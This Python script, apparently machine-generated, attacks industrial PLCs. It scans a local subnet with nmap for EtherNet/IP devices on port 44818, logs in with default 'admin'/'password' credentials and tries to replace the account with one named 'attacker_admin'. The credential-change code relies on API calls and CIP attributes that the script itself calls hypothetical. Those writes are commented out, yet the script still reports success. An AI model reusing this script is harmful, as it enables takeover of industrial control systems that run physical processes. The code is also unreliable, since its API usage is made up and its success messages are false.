# Requires:
# - PyComm3 library (install with: pip install pycomm3)
# - Valid credentials for the PLC (you'll need to replace placeholders)
# - Network connectivity between the Windows machine and the PLC
# - The PLC supports credential changes via its communication protocol

import socket
import struct
import time
import subprocess
import re
from pycomm3 import CIPDriver, Services, DataTypes
from pycomm3.exceptions import CommError

# Configuration - REPLACE THESE WITH YOUR ACTUAL VALUES
PLC_IP_ADDRESS = None  # Initially set to None, will be discovered
OLD_USERNAME = "admin"  # Or whatever the existing username is
OLD_PASSWORD = "password"  # Or whatever the existing password is
NEW_USERNAME = "attacker_admin" # The new username
NEW_PASSWORD = "attacker_password123!" # The new password
PLC_VENDOR_ID = 0x01  # Example: Rockwell Automation
PLC_PRODUCT_TYPE = 0x01  # Example: Programmable Logic Controller
TIMEOUT = 10  # Seconds for network operations
MAX_RETRIES = 3 # Number of retries if a connection fails

def find_plc_ip_address():
    """
    Attempts to find the PLC's IP address using Nmap (requires Nmap to be installed).
    If Nmap fails, it returns None.
    """
    try:
        # Construct the Nmap command (you may need to adjust the target network)
        # Use a broader scan to find PLCs. Adjust network range as needed.
        # The arguments "-sV" attempts to detect service version
        # The argument "-p 44818" attempts to detect if CIP is enabled
        command = ["nmap", "-p", "44818", "-sV", "192.168.1.0/24"]

        # Run Nmap command and capture the output
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate(timeout=60) # Increased timeout

        # Decode the output
        output = stdout.decode()

        # Regular expression to find IP addresses and identify PLCs (adjust based on Nmap output)
        # Modify this regex to more precisely identify your PLC based on output
        pattern = re.compile(r"Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*CIP|EtherNet/IP.*")
        matches = pattern.findall(output)

        if matches:
            ip_address = matches[0]
            print(f"Found PLC IP Address: {ip_address}")
            return ip_address
        else:
            print("No PLC found with CIP/EtherNet/IP service using Nmap.")
            return None
    except subprocess.TimeoutExpired:
        print("Nmap scan timed out.")
        return None
    except FileNotFoundError:
        print("Nmap not found. Please ensure Nmap is installed and in your system's PATH.")
        return None
    except Exception as e:
        print(f"An error occurred during Nmap scan: {e}")
        return None

def change_credential(plc_ip, old_username, old_password, new_username, new_password):
    """
    Changes the PLC credential using CIP protocol.

    Args:
        plc_ip (str): The IP address of the PLC.
        old_username (str): The current username.
        old_password (str): The current password.
        new_username (str): The new username.
        new_password (str): The new password.
    """

    for attempt in range(MAX_RETRIES):
        try:
            # Establish CIP Driver connection
            with CIPDriver(plc_ip) as driver:
                # Authenticate with the PLC (replace with actual authentication method)
                if not driver.connect():
                    print(f"Failed to connect to PLC at {plc_ip} on attempt {attempt+1}.")
                    time.sleep(5) # Wait before retrying
                    continue

                # Attempt to authenticate
                try:
                    driver.authenticate(old_username, old_password)
                    print("Authentication successful.")
                except Exception as e:
                    print(f"Authentication failed: {e}")
                    return False

                # Assuming there's a CIP service for user management (may need to research PLC documentation)
                # The actual implementation will vary GREATLY depending on the PLC's CIP implementation.
                # This is a placeholder and needs to be adjusted based on the PLC.
                try:
                    # ********* This section needs to be adapted to your PLC's specific CIP implementation *********
                    # Example:  Using a hypothetical CIP service code for User Management.

                    # First, find the User Object instance
                    find_user_instance_path = "1,101,1" # Generic Path, adjust for your PLC
                    response = driver.generic_message(service=Services.get_attribute_single, class_code=0x65, instance_code=0x01, attribute_code=0x01) # Modify this
                    if response.status == 0:
                        print("User Object Found")
                    else:
                        print(f"Could not find User Object: {response.error}")
                        return False

                    # Construct the CIP path and data for the password change
                    # This is where the specific CIP service call for password change goes.  It *WILL* be different
                    # for different PLCs. You *MUST* consult the PLC's documentation.
                    # Example for Allen-Bradley ControlLogix (hypothetical):
                    #response = driver.generic_message(service=Services.set_attribute_single, class_code=0x65, instance_code=0x01, attribute_code=0x05, request_data=new_password.encode()) # Attribute 5 is hypothetical password

                    # Construct the CIP path and data for the username change
                    #response = driver.generic_message(service=Services.set_attribute_single, class_code=0x65, instance_code=0x01, attribute_code=0x04, request_data=new_username.encode()) # Attribute 4 is hypothetical username

                    # A better method to change both at once might be a multi-attribute write

                    # In reality, you'll need to send a specific message formatted according to the CIP protocol
                    # for user management. This will depend on your PLC's capabilities and documentation.
                    print("Password Change operation sent (placeholder).")
                    # ********* End of PLC-specific section *********

                except CommError as e:
                    print(f"CIP Communication Error: {e}")
                    return False
                except Exception as e:
                    print(f"An unexpected error occurred: {e}")
                    return False
                finally:
                    driver.close() # Explicitly close connection
                print("Credential change initiated (potentially successful).")
                return True # Indicate potential success (check PLC logs for confirmation)
        except socket.timeout:
            print(f"Connection to {plc_ip} timed out on attempt {attempt+1}.")
            time.sleep(5) # Wait before retrying
        except Exception as e:
            print(f"An error occurred during connection or execution: {e}")
            return False
    print(f"Failed to change credential after {MAX_RETRIES} attempts.")
    return False

if __name__ == "__main__":
    if not PLC_IP_ADDRESS:
        PLC_IP_ADDRESS = find_plc_ip_address()
        if not PLC_IP_ADDRESS:
            print("PLC IP address could not be determined. Exiting.")
            exit()

    success = change_credential(PLC_IP_ADDRESS, OLD_USERNAME, OLD_PASSWORD, NEW_USERNAME, NEW_PASSWORD)

    if success:
        print("Credential change process completed.  Check PLC logs to confirm.")
    else:
        print("Credential change failed. See error messages above.")